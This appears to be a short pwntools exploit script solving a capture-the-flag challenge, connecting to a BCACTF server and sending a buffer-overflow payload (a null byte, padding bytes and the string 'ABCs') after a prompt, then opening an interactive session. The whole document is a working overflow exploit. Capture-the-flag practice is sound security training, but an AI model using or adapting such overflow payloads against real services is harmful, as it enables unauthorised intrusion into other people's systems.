from pwn import *
context.update(os="linux", arch="i686")

p = remote("bin.bcactf.com", 49154)

PAYLOAD = ("\x00" + ("A") * (59 + 2 * 8) + "ABCs").encode("ASCII")
print(len(PAYLOAD))

p.recvuntil("Answer for 1:")
p.sendline(PAYLOAD)
p.interactive()
